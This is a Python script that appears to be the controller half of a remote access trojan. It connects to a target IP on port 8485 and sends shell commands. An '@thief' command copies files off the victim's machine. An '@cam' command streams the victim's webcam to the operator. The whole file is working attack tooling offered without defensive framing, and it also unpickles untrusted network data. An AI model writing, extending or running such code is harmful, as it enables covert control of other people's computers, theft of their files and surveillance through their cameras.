import socket                   # Import socket module
import sys
import threading as the
import struct
import pickle
import cv2
import colorama

Target_Ip = sys.argv[1] 
Network = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
Network.connect((Target_Ip,8485))
connection = Network.makefile('wb')



Current_dir = "root"

def Cam_Recv():
   Con = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
   Con.connect((Target_Ip,8485))
   data = b""
   payload_size = struct.calcsize(">L")
   while True:
      while len(data) < payload_size:
         data += Con.recv(4096)
      packed_msg_size = data[:payload_size]
      data = data[payload_size:]
      msg_size = struct.unpack(">L", packed_msg_size)[0]
      while len(data) < msg_size:
         data += Con.recv(4096)
      frame_data = data[:msg_size]
      data = data[msg_size:]
      frame=pickle.loads(frame_data, fix_imports=True, encoding="bytes")
      frame = cv2.imdecode(frame, cv2.IMREAD_COLOR)
      cv2.imshow('Target',frame)
      cv2.waitKey(1)
         
def Cam_Send():
   Cons = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
   Cons.connect((Target_Ip,8485))
   Cam = cv2.VideoCapture(0)
   Cam.set(3, 1920)
   Cam.set(4, 1080)
   encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), 90]
   while True:
      ret, frame = Cam.read()
      result, frame = cv2.imencode('.jpeg', frame, encode_param)
      data = pickle.dumps(frame, 0)
      size = len(data)
      Cons.sendall(struct.pack(">L", size) + data)
   Cam.release()

while True:
   print("")
   Command = input(colorama.Fore.GREEN + f"[$] "+"{ " + Current_dir + " }"+"  --> : ")
   print(colorama.Fore.BLUE)
   Network.send(Command.encode())

   if Command.split(" ")[0] == "cd":
      print(Network.recv(2048).decode())
      Current_dir = Network.recv(2048).decode()
   elif Command.split(" ")[0] == "@thief":
      with open(Command.split(" ")[1] + " By Theif ", 'wb') as file:
         data = Network.recv(2048)
         if not data:
            print("break")
            break
         file.write(data)
         file.close()
      print(Network.recv(2048).decode())
   elif Command.split(" ")[0] == "@cam":
      if Command.split(" ")[1] == "cast":
         Cam_sen = the.Thread(target= Cam_Send).start()
         datas  = Network.recv(2048).decode()
         print(datas)
      elif Command.split(" ")[1] == "show":
         Cam_Rec = the.Thread(target=Cam_Recv).start()
         datas  = Network.recv(2048).decode()
         print(datas)

   elif Command.split(" ")[0] == "dir":
      datas = Network.recv(2048).decode().split("    ")
      print(*datas,sep="\n") 
   else:
      Package = Network.recv(2048).decode()
      Current_dir = Network.recv(2048).decode()
      print(Package)
